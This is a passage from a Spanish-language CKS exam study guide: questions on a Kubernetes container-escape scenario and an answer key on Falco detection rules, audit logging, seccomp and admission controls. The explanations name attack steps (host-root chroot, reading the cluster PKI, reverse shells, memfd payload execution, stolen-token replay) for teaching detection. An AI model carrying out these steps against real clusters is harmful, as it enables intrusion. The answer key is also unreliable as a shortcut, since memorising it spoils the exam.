- **Q31.** Los pasos (a) a (f) son seis alertas. Argumentá por qué "≥3 reglas CRITICAL/WARNING distintas sobre el mismo `container.id` en 60 s" es una mejor condición de paginación que cualquiera de ellas por separado.
- **Q32.** El paso `chroot /host` es el escape propiamente dicho. ¿Qué señal *anterior* en la cadena fue la última oportunidad barata de bloquearlo, y qué control en tiempo de admisión habría eliminado la posibilidad por completo?
- **Q33.** La detección de runtime vio la lectura del token (d); el audit log no vio nada. Si el atacante hubiera usado después ese token contra el API server desde un host externo, ¿qué feed lo atraparía, y qué campo lo identifica?
- **Q34.** Supongamos que el atacante ejecutó toda la cadena en menos de 200 ms mediante un único `exec` scripteado, y que Falco estaba reportando descartes de syscalls en ese momento. ¿Cuál es tu confianza en el conjunto de alertas, y cuál es la remediación?
- **Q35.** La analítica de comportamiento es detectiva, no preventiva. Nombrá los tres controles preventivos que habrían roto esta cadena, cada uno en un eslabón distinto, e indicá a qué dominio de CKS pertenece cada uno.

---

<details>
<summary><strong>Respuestas</strong></summary>

**Q1.** El *driver* es el recolector del lado del kernel (módulo de kernel, probe eBPF legacy, o eBPF CO‑RE moderno). Si es incompatible con el kernel en ejecución, Falco o bien falla al abrir la fuente de syscalls y sale, o bien — peor en el caso de kmod — carga y produce eventos malformados. La versión del *engine* es el ABI del lenguaje de reglas. Un archivo de reglas que declara `required_engine_version: 0.44.0` sobre un engine más viejo es rechazado en tiempo de carga con un error de validación, así que se saltea el archivo entero (no solo una regla). Ambas fallas son huecos de detección silenciosos: el daemon se ve sano en `systemctl status`, que es exactamente para lo que existe el paso 6.

**Q2.** `modern_ebpf` usa CO‑RE (Compile Once – Run Everywhere) con BTF, así que un único probe precompilado corre en todos los kernels sin compilar nada por nodo — sin `dkms`, sin `linux-headers-$(uname -r)`, sin kernel tainted, y sin reiniciar para descargar un módulo roto. Además no puede provocar un panic del kernel como sí puede un módulo. El requisito duro es un kernel ≥ 5.8 con BTF habilitado (`CONFIG_DEBUG_INFO_BTF=y`, verificable vía `/sys/kernel/btf/vmlinux`).

**Q3.** `container_id=host` significa que el proceso **no** estaba en un contenedor — corrió directamente en los namespaces de PID/mount del host, es decir, en el nodo mismo. Si hubiera corrido en un Pod, `container.id` tendría el ID truncado del contenedor del runtime y, con el enriquecimiento de metadatos activo, `k8s.ns.name`, `k8s.pod.name` y `container.image.repository` identificarían el workload. La macro `container` es literalmente `container.id != host`, así que este único campo es el interruptor que separa las detecciones a nivel de nodo de las de nivel de workload.

**Q4.** Dos drivers compitiendo por la misma fuente de syscalls. La segunda unidad en arrancar típicamente falla al abrir la fuente (los ring buffers/probe ya están enganchados, o el módulo entra en conflicto con el programa eBPF) y la unidad entra en un bucle de reinicio; alternativamente ambos corren y obtenés alertas duplicadas más el doble de costo de CPU. Falco está diseñado para correr exactamente una instancia por nodo con exactamente un driver — habilitá una unidad y enmascará las demás.

**Q5.** Una **list** es un conjunto con nombre de valores literales, sustituido textualmente dentro de expresiones `in (...)` — no lleva lógica de condición. Una **macro** es un *fragmento de condición* reutilizable y con nombre (una expresión booleana) que puede referenciar otras macros y listas. Una **rule** es la unidad completa: condición + output + prioridad + tags, y es la única de las tres que produce una alerta. Ninguna de ellas puede aparecer en una cadena de `output` — los outputs interpolan **campos** (`%proc.name`, `%fd.name`), que vienen del esquema de eventos, no del vocabulario de reglas.

**Q6.** Cualquier cosa que lance una shell sin terminal de control, o cuyo padre no sea un shim del runtime. Ejemplos: una reverse shell lanzada por un proceso de aplicación ya en ejecución (`nginx` → `sh -i` canalizada por un socket) tiene `proc.tty = 0` **y** falla `container_entrypoint` porque su padre es `nginx`, no `containerd-shim`. `kubectl exec` *sin* `-t` también da `proc.tty = 0`. La cláusula `proc.tty != 0` existe para recortar ruido de scripts de init, y ese es exactamente el hueco que usa un atacante — por eso lo complementás con las reglas estructurales del Ejercicio 4.

**Q7.** `open_read` está definido en `falco_rules.yaml`. Si el archivo local carga primero, la macro está indefinida en el punto de referencia y Falco reporta un **error de compilación/validación** para esa regla — `Invalid: unknown macro 'open_read'`. Según la configuración, Falco o se niega a arrancar o carga el archivo descartando esa regla. Las definiciones deben preceder al uso, y el orden de `rules_files` es el orden de definición.

**Q8.** Los niveles de madurez codifican *riesgo de falsos positivos*, no antigüedad. Las reglas `stable` fueron validadas contra tráfico de producción amplio y diverso; las reglas `incubating` y `sandbox` son útiles pero se sabe que son ruidosas o específicas del entorno. Distribuirlas habilitadas inundaría cada instalación nueva con alertas desde el día uno, y un operador que aprende a ignorar la salida de Falco tiene una postura de seguridad estrictamente peor que uno sin Falco. La fatiga de alertas es el argumento operativo — a esos niveles se entra deliberadamente, por entorno, después de afinar.

**Q9.** Falco resuelve `fd.name` desde la perspectiva del proceso que emitió la syscall, es decir, dentro de su mount namespace. Esa es la semántica correcta — es la ruta que usó el *atacante* — y hace que las reglas sean portables entre nodos, ya que la ruta del lado del host del kubelet incluye un UID por Pod que cambia en cada reprogramación. La implicancia: escribí los matches de ruta contra rutas dentro del contenedor (`/var/run/secrets/...`), y nunca contra `/var/lib/kubelet/pods/<uid>/...`. A la inversa, una regla destinada a atrapar acceso al *host* debe matchear la ruta del host y no verá la vista del contenedor.

**Q10.** Modos de falla del copiar-y-pegar: (1) **Duplicación silenciosa** — cargan tanto la regla distribuida como tu copia, así que cada evento alerta dos veces (o, bajo `rule_matching: first`, gana la distribuida y tu edición queda inerte). (2) **Deriva por actualización** — `falcoctl artifact follow` actualiza `falco_rules.yaml` con condiciones mejoradas y uso de campos nuevos; tu copia congelada nunca los recibe, así que corrés silenciosamente una detección obsoleta creyendo estar al día. `override` expresa un *delta* contra la regla upstream actual, sea cual sea, así que las actualizaciones componen en lugar de colisionar.

**Q11.** `proc.aname[2]` es el nombre del proceso dos niveles arriba en la cadena de ancestros (`aname[0]` es el proceso mismo, `[1]` el padre). Importa porque el atacante controla trivialmente el proceso inmediato — renombrar el binario, hacer `exec` a través de una shell — pero el *linaje* refleja cómo se llegó realmente al proceso. `nginx → sh → curl` y `containerd-shim → bash → curl` cuentan historias completamente distintas sobre el mismo `proc.name=curl`, y solo la ascendencia distingue "el servidor web fue explotado" de "un operador corrió un comando".

**Q12.** El campo lo puebla el enriquecimiento de metadatos de contenedor/Kubernetes de Falco. En Falco moderno los flags legacy `-k`/`-K` del API server fueron removidos; el enriquecimiento viene del socket del container runtime (así que Falco debe tener acceso al socket CRI, p. ej. `/run/containerd/containerd.sock`) y, para metadatos de Pod más ricos, del plugin `k8smeta` respaldado por el despliegue de `k8s-metacollector`. Sin enriquecimiento la alerta igual dispara — `container.id` se deriva de cgroups y no necesita nada externo — pero `k8s.ns.name` y `k8s.pod.name` se renderizan como `<NA>`, y peor, **la regla misma nunca matchearía** porque `shop_workload` compara `k8s.ns.name` con un literal. Esa es una lección de diseño real: preferí campos independientes del enriquecimiento en la *condición*, y usá campos enriquecidos en el *output*.

**Q13.** Una imagen OCI es una pila de capas de solo lectura; la capa escribible del contenedor se apoya arriba como el directorio *upper* de overlayfs. Cada binario horneado en la imagen resuelve en una capa inferior. Así que `proc.is_exe_upper_layer=true` significa que el archivo ejecutable no existía cuando se construyó la imagen — fue escrito después de que el contenedor arrancó. El violador legítimo es cualquier workload que instale software en tiempo de ejecución: contenedores de CI/build, `apt-get`/`pip install` en un entrypoint, o runtimes de lenguajes que compilan JIT a disco. Esos son exactamente los workloads que deberían exceptuarse por namespace o imagen, no por nombre de proceso.

**Q14.** `memfd_create(2)` devuelve un descriptor de archivo respaldado por memoria anónima sin ruta en el sistema de archivos; el loader escribe el payload en él y llama a `execveat()` sobre el fd. Nunca se escribe nada en la capa upper de overlayfs, así que tanto el monitoreo de integridad de archivos como la regla de upper layer no ven nada. `proc.is_exe_from_memfd = true` lo atrapa (la ruta del exe se renderiza como `memfd:<name>`), y por eso la segunda regla del Ejercicio 4 existe como compañera, no como agregado.

**Q15.** No. `cp` crea un *archivo nuevo* en la capa upper, así que en realidad **sí** dispara — la copia es un inodo fresco en la capa escribible sin importar dónde vivía el origen. La regla solo falla si el atacante ejecuta el original en su lugar (`/bin/busybox sh`), que es de capa inferior y por lo tanto invisible para esta señal. Ese hueco residual lo cubren reglas de nombre/ascendencia como `Terminal shell in container`, lo que ilustra por qué se apilan detecciones estructurales y de comportamiento en vez de elegir entre ellas.

**Q16.** Con `readOnlyRootFilesystem: true` la capa escribible desaparece, así que el `cp` del paso 3 falla con `EROFS` y la regla nunca dispara — la prevención funcionó. Pero los volúmenes `emptyDir`, los montajes de `/tmp` y `/dev/shm` siguen siendo escribibles y *no* son la capa upper de overlayfs, así que un payload dropeado ahí y ejecutado evade la regla mientras el escape igual tiene éxito. La detección sigue siendo valiosa porque cubre las rutas que la prevención dejó abiertas deliberadamente, y porque te dice que alguien *intentó*.

**Q17.** `Seccomp: 2` significa seccomp modo 2 — hay un filtro BPF cargado (modo 0 = deshabilitado, modo 1 = estricto). Las otras dos líneas a chequear primero son **`CapEff`**, la máscara de capabilities efectivas (`00000000a80425fb` es el conjunto por defecto de Docker/containerd; `0000003fffffffff` significa que el contenedor es efectivamente privilegiado), y **`NoNewPrivs`**, que si es `0` permite que binarios setuid escalen — la precondición de toda una clase de escapes. `/proc/$PID/ns/` es el tercer pilar: si los números de inodo de `mnt`, `pid` o `net` coinciden con los del host (`readlink /proc/1/ns/mnt`), el contenedor comparte ese namespace con el nodo.

**Q18.** `ptrace(2)` permite que un proceso lea y modifique la memoria de otro e intercepte sus syscalls, así que el kernel lo restringe detrás de `CAP_SYS_PTRACE` (más la política `ptrace_scope` de Yama). En el caso del contenedor efímero además necesitás *ver* el proceso objetivo: `kubectl debug --target=<container>` pone el contenedor de depuración en el namespace de PID del objetivo, que es lo que hace que `strace -p 1` tenga sentido. `--profile=sysadmin` (GA en Kubernetes 1.30) define un `securityContext` con `privileged: true` y un conjunto completo de capabilities en el contenedor efímero — es una comodidad para exactamente este flujo de trabajo y nunca debería ser un default en un namespace con políticas aplicadas.

**Q19.** El tracing basado en `ptrace` detiene al trazado en **cada** entrada y salida de syscall trazada y hace un cambio de contexto hacia el trazador, así que el costo escala con la tasa de syscalls — una ralentización de un orden de magnitud en procesos intensivos en I/O es rutinaria, y en un servicio sensible a la latencia es una caída de servicio. La alternativa eBPF se engancha a tracepoints en el kernel y escribe a un ring buffer por CPU sin detener el proceso: `bpftrace` para one-liners ad-hoc, o las mismas libs de Falco/`sysdig` (`sysdig -p ...`) que ya tenés en el nodo. Cilium Tetragon cubre el mismo terreno con política dentro del kernel y aplicación opcional.

**Q20.** `strace -c` registra solamente las syscalls que el proceso hizo **durante la ventana de observación**. Las syscalls de arranque faltan si te enganchaste tarde; las rutas de error, la rotación de logs, la recarga de certificados TLS, el apagado ordenado y las ramas de código poco transitadas faltan a menos que las hayas ejercitado. Un perfil de seccomp construido a partir de ese trace matará el workload con `SIGSYS` la primera vez que toque una ruta no observada — típicamente en producción, típicamente durante un incidente. El procedimiento correcto es: correr en modo **audit** de seccomp (`SCMP_ACT_LOG`) a lo largo de un ciclo de vida completo del workload incluyendo rutas de falla, recolectar del log de auditoría, y recién ahí pasar a `SCMP_ACT_ERRNO`.

**Q21.** `pods/exec` en `RequestResponse` es seguro y valioso: el cuerpo de la petición de un exec no lleva material secreto, y la URI ya contiene el comando, el contenedor y el Pod — querés el registro completo porque el acceso interactivo es inherentemente de alta señal. `secrets` en `RequestResponse` escribiría el **payload decodificado del Secret** — contraseñas, tokens, claves privadas — dentro de `audit.log` en texto plano, convirtiendo tu rastro de auditoría en el objetivo de mayor valor del plano de control y típicamente en una violación de cumplimiento. `Metadata` registra quién leyó qué Secret y cuándo, que es todo lo que una detección necesita.

**Q22.** El catch-all matchea *toda* petición, así que gana primero para todas y ninguna regla posterior se consulta jamás. Registrarías todo a nivel `Metadata`: perdés el detalle de `RequestResponse` en `pods/exec` y en los cambios de RBAC, y perdés toda la supresión de ruido de `level: None`, así que el volumen explota mientras la fidelidad cae. Ordená la política de lo más específico a lo más general, siempre.

**Q23.** La decisión de autorización aparece en `ResponseComplete` (los campos `annotations["authorization.k8s.io/decision"]` y `.../reason`). `RequestReceived` se dispara antes de la autorización y no lleva resultado, y por eso omitirla es casi gratis. La querrías de vuelta al investigar peticiones que **nunca se completaron** — un cliente que abrió una petición y desapareció, un API server que se colgó o crasheó a mitad de petición, o un watch de larga duración — porque para esos nunca se escribe el `ResponseComplete`. También existe `ResponseStarted`, que es lo que obtenés para peticiones de streaming de larga duración.

**Q24.** Una petición denegada revela **intención sin capacidad** — es la evidencia más clara posible de que una identidad se está usando para algo fuera de su propósito de diseño, y casi nunca la genera software correctamente configurado. Las peticiones permitidas son ambiguas: se ven idénticas ya sea que quien llama sea el controlador legítimo o un atacante con su token. Una ráfaga de 403s a través de muchos tipos de recursos desde una identidad es enumeración de permisos de manual (`kubectl auth can-i --list`, o una herramienta como `kubectl-who-can` corriendo desde dentro de un Pod) y normalmente precede a la acción exitosa, dándote tiempo de responder.

**Q25.** El backend de **archivo de log** escribe localmente y nunca bloquea el API server; no pierde nada del lado del API server, pero Falco debe hacer tail del archivo, así que se pierden eventos si el shipper está caído y el archivo rota antes de que se ponga al día. El backend de **webhook** empuja hacia Falco por HTTP: si Falco está caído, los eventos se descartan una vez agotado el presupuesto de reintentos, y si Falco está lento, el batching (`--audit-webhook-batch-max-wait`, `--audit-webhook-batch-max-size`) hace que el API server bufferee y pueda degradarse por back-pressure. La práctica de producción es correr ambos: archivo para durabilidad y forense, webhook para detección en tiempo real.

**Q26.** `priority: notice` en `falco.yaml` es un **piso global** — las reglas con severidad por debajo de `NOTICE` ni siquiera son evaluadas por el motor, así que no cuestan nada y nunca pueden alertar. `priority: CRITICAL` en una regla es la severidad declarada de esa regla, usada para enrutamiento y filtrado aguas abajo. Bajo esta configuración una regla `INFORMATIONAL` queda silenciosamente inerte: carga, `falco -L` la lista, y nunca va a disparar. Esta es una de las causas más comunes de "mi regla no funciona" — la escalera de severidad es `EMERGENCY > ALERT > CRITICAL > ERROR > WARNING > NOTICE > INFORMATIONAL > DEBUG`.

**Q27.** Con `first`, la evaluación se detiene en la primera regla que matchea en orden de carga. Si una regla amplia y de baja severidad (digamos una "shell en contenedor" de nivel `NOTICE`) está definida antes de tu regla `CRITICAL` estrecha para el mismo evento, gana la alerta genérica y la específica nunca dispara — recibís un aviso de baja prioridad por algo que en realidad era una detección crítica. Poné `rule_matching: all` cuando querés deliberadamente detecciones superpuestas (p. ej. una regla genérica más una específica del workload), y aceptá el costo extra de evaluación.

**Q28.** Con el buffering habilitado, las alertas quedan en un buffer de salida hasta que se llena o expira un timeout. Durante una intrusión activa las dos cosas más probables son que el atacante mate el proceso de Falco o tire abajo el nodo — y cualquier cosa todavía en el buffer se pierde, precisamente para los eventos que más importaban. La salida sin buffer escribe cada alerta inmediatamente, cambiando throughput por la garantía de que una alerta que fue *generada* también fue *emitida*.

**Q29.** El probe del lado del kernel escribe eventos en ring buffers por CPU de tamaño fijo; si el espacio de usuario no los drena lo bastante rápido, el kernel sobrescribe o descarta eventos. Mecánicamente, perdiste syscalls — lo que significa que cualquier regla que necesitara esos eventos no disparó, y no podés saber cuál. Reducciones: aumentar el tamaño del buffer (`engine.kmod.buf_size_preset` / el dimensionamiento del ring buffer del eBPF moderno, y `--cpus-for-each-buffer`), y recortar el volumen de ingesta afinando el ruleset activo o aplicando filtrado por `base_syscalls`/tipo de evento para que se capturen menos syscalls de entrada. Tratarlo como una advertencia es un error porque un descarte es una **caída de la detección**, no una nota de rendimiento — un atacante que genera tormentas de syscalls puede inducir descartes deliberadamente como técnica de evasión.

**Q30.** Una captura `.scap` almacena eventos crudos de syscalls más los metadatos de contenedor resolubles en el momento de la captura; los metadatos de Pod/namespace de Kubernetes vienen del enriquecimiento en vivo contra el runtime y el metadata collector, que no está disponible durante la reproducción. Campos como `k8s.ns.name` por lo tanto se renderizan `<NA>`, y cualquier condición apoyada en ellos no matcheará. Usá capturas para testear por regresión la lógica a *nivel de syscall*, y validá siempre en vivo las condiciones dependientes del enriquecimiento.

**Q31.** Cada alerta individual tiene una explicación benigna plausible: un SRE corre `kubectl exec` (a), un agente de monitoreo lee archivos de configuración (b), un contenedor de build escribe y ejecuta un binario (e). Cada una de ellas, tomada sola, genera suficientes falsos positivos en un clúster real como para ser despriorizada. Lo que no tiene explicación benigna es la **conjunción**: acceso interactivo, seguido de lectura de credenciales, seguido de la ejecución de un binario que no existía al construir la imagen, todo en el mismo contenedor dentro de un minuto. La correlación convierte varias señales ruidosas en una de alta precisión, que es el punto entero de la analítica de comportamiento en contraposición al matcheo de reglas.

**Q32.** La última oportunidad barata fue (c), `ls /host/etc/kubernetes/pki` — un proceso dentro de un contenedor leyendo una ruta que solo es alcanzable porque se montó la raíz del host. En ese momento el atacante tenía visibilidad de la CA del clúster y los certificados del plano de control pero todavía no había ejecutado en el nodo; matar el Pod ahí contiene el incidente. En tiempo de admisión, una etiqueta `baseline`/`restricted` de Pod Security Admission en el namespace (o una política equivalente de Kyverno/Gatekeeper) rechaza el Pod de plano: `restricted` prohíbe `privileged: true`, y ambos prohíben volúmenes `hostPath`. El manifiesto del paso 1 nunca habría sido admitido.

**Q33.** Lo atrapa el **audit log**. Un atacante externo reproduciendo el token robado se autentica como `system:serviceaccount:shop:builder` — el campo `user.username` — y, en Kubernetes 1.34 con tokens de ServiceAccount vinculados (bound), la entrada de auditoría también lleva la vinculación del token en `user.extra` (`authentication.kubernetes.io/pod-name` y `.../pod-uid`, más el ID de credencial). La detección es la discrepancia entre esa vinculación de Pod registrada y los `sourceIPs` de la petición: un token vinculado a un Pod en `node01` llegando desde una dirección fuera del clúster es robo de credenciales inequívoco. La detección de runtime no ve nada, porque nada pasa en el nodo.

**Q34.** Baja confianza, y específicamente confianza **asimétrica**: las alertas que recibiste siguen siendo verdaderos positivos (Falco no fabrica eventos), pero la *ausencia* de una alerta no prueba nada, así que no podés acotar el alcance de la intrusión solo a partir del conjunto de alertas. La remediación es doble: tratar el incidente como de alcance desconocido y apoyarte en evidencia que no dependa del stream descartado — audit logs, estado de `/proc` en el nodo, forense de imagen y sistema de archivos — y arreglar la condición de descarte (ring buffers más grandes, más buffers por CPU, menor ingesta de syscalls) antes del próximo incidente. Descartes persistentes en un nodo significan que ese nodo no tiene detección de runtime confiable.

**Q35.** (1) **Pod Security Admission `restricted`**, o una política de Kyverno/Gatekeeper, rechazando `privileged: true` y `hostPath` — Cluster Setup y Hardening; esto rompe la cadena en admisión, antes de que el Pod exista. (2) **RBAC de mínimo privilegio** — vincular el ServiceAccount `builder` a un Role de alcance estrecho en lugar de `admin`, más `automountServiceAccountToken: false` donde el token no se necesita — Cluster Hardening; esto vuelve inútil el token robado del paso (d). (3) **Un perfil de seccomp y un sistema de archivos raíz de solo lectura con capabilities descartadas** — el seccomp `RuntimeDefault` bloquea las syscalls que necesita un escape con `chroot`, `readOnlyRootFilesystem` bloquea el drop del binario en (e) — Minimize Microservice Vulnerabilities. La analítica de comportamiento es lo que te dice que estos controles fueron atacados, y lo que te cubre el día en que uno de ellos esté mal configurado.

</details>

---

## Fuentes

- CNCF, *Certified Kubernetes Security Specialist (CKS) Curriculum v1.34* — https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
- The Falco Project, *Rules* y *Rules Fields* — https://falco.org/docs/concepts/rules/ · https://falco.org/docs/reference/rules/supported-fields/
- The Falco Project, *Falco Configuration* — https://falco.org/docs/reference/daemon/config-options/
- The Falco Project, *Event Sources: Kubernetes Audit Events* — https://falco.org/docs/event-sources/kubernetes-audit/
- The Falco Project, *Installation and Drivers* — https://falco.org/docs/install-operate/installation/ · https://falco.org/docs/concepts/event-sources/kernel/
- Kubernetes, *Auditing* — https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- Kubernetes, *Debug Running Pods (ephemeral containers and debugging profiles)* — https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/
- Kubernetes, *Seccomp and Restrict a Container's Syscalls* — https://kubernetes.io/docs/tutorials/security/seccomp/
- Páginas de manual de Linux `strace(1)`, `ptrace(2)`, `memfd_create(2)`, `auditctl(8)` — https://man7.org/linux/man-pages/
- MITRE ATT&CK for Containers — https://attack.mitre.org/matrices/enterprise/containers/